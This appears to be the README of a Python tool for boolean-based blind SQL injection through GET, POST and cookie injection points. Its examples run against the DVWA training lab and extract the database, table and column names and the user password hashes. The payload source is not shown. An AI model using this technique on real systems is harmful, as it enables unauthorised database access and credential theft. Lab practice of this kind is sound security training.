# sqli_bool
A simple tool/framework for boolean-based sql injection(GET/POST/COOKIE) 

**sqli_bool是一款用于基于布尔的SQL盲注的简单工具/框架，支持GET方法，POST方法，以及注入点在cookie中的情况**

# 简介

sqli_bool是为了方便手工SQL布尔盲注而开发的小工具/框架，目前支持GET方法，POST方法，以及注入点在cookie中的情况。
其主要目的是辅助手工注入，缩短手工注入的时间。  
使用者需要根据实际情况修改payload和部分参数。  
小工具（的示例）基于dvwa漏洞平台SQL Injection (Blind)关卡开发，如有必要可以用这个关卡进行测试。

# 环境要求

本工具基于python3，使用前请先确保安装了python3

# 使用方法

1 下载源代码，根据实际情况修改sqli_bb_get.py，sqli_bb_post.py和sqli_bb_cookie.py的payload和部分参数   
2 命令行进入源代码所在文件夹（比如sqli_bool）上级文件夹
输入  
python  
\>\>\> from sqli_bool import *  
然后调用各函数即可

# 示例

## 布尔盲注（注入点在url中，cookie包含多个值）

以dvwa漏洞平台SQL Injection (Blind)关卡low等级为例：
  
\>>> from sqli_bool import *    
\>>> CurrentDatabaseGET()       
the name of current database contains 4 characters   
the name of current database is DVWA   
\>>> TablesGET()   
the name of all tables in current database contains 15 characters   
the name of all tables in current database is GUESTBOOK,USERS        
\>>> ColumnsGET('USERS')  
the name of all columns in current table contains 164 characters   
the name of all columns in current table is   USER_ID,FIRST_NAME,LAST_NAME,USER,PASSWORD,AVATAR,LAST_LOGIN,FAILED_LOGIN,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,ID,USERNAME,PASSWORD,LEVEL,ID,USERNAME,PASSWORD   
\>>> ContentGET('USERS','USER','PASSWORD')  
the content contains 196 characters   
the content is ADMIN^5F4DCC3B5AA765D61D8327DEB882CF99,GORDONB^E99A18C428CB38D5F260853678922E03,1337^8D3533D75AE2C3966D7E0D4FCC69216B,PABLO^0D107D09F5BBE40CADE3DE5C71E9E9B7,SMITHY^5F4DCC3B5AA765D61D8327DEB882CF99  

## 布尔盲注（注入点在POST报文请求体中，cookie包含多个值，单引号过滤绕过）

以dvwa漏洞平台SQL Injection (Blind)关卡medium等级为例：

\>>> from sqli_bool import *   
\>>> CurrentDatabasePOST()    
the name of current database contains 4 characters    
the name of current database is DVWA   
\>>> TablesPOST()  
the name of all tables in current database contains 15 characters  
the name of all tables in current database is GUESTBOOK,USERS  
\>>> ColumnsPOST('USERS')  
the name of all columns in current table contains 164 characters  
the name of all columns in current table is   USER_ID,FIRST_NAME,LAST_NAME,USER,PASSWORD,AVATAR,LAST_LOGIN,FAILED_LOGIN,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,ID,USERNAME,PASSWORD,LEVEL,ID,USERNAME,PASSWORD  
\>>> ContentPOST('USERS','USER','PASSWORD')  
the content contains 196 characters  
the content is   ADMIN^5F4DCC3B5AA765D61D8327DEB882CF99,GORDONB^E99A18C428CB38D5F260853678922E03,1337^8D3533D75AE2C3966D7E0D4FCC69216B,PABLO^0D107D09F5BBE40CADE3DE5C71E9E9B7,SMITHY^5F4DCC3B5AA765D61D8327DEB882CF99    

## 布尔盲注（注入点在Cookie头中，cookie包含多个值）  

以dvwa漏洞平台SQL Injection (Blind)关卡high等级为例：  

\>>> from sqli_bool import *  
\>>> CurrentDatabaseCOOKIE()  
the name of current database contains 4 characters  
the name of current database is DVWA  
\>>> TablesCOOKIE()  
the name of all tables in current database contains 15 characters  
the name of all tables in current database is GUESTBOOK,USERS  
\>>> ColumnsCOOKIE('USERS')  
the name of all columns in current table contains 164 characters  
the name of all columns in current table is    USER_ID,FIRST_NAME,LAST_NAME,USER,PASSWORD,AVATAR,LAST_LOGIN,FAILED_LOGIN,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,ID,USERNAME,PASSWORD,LEVEL,ID,USERNAME,PASSWORD  
\>>> ContentCOOKIE('USERS','USER','PASSWORD')  
the content contains 196 characters  
the content is   ADMIN^5F4DCC3B5AA765D61D8327DEB882CF99,GORDONB^E99A18C428CB38D5F260853678922E03,1337^8D3533D75AE2C3966D7E0D4FCC69216B,PABLO^0D107D09F5BBE40CADE3DE5C71E9E9B7,SMITHY^5F4DCC3B5AA765D61D8327DEB882CF99  
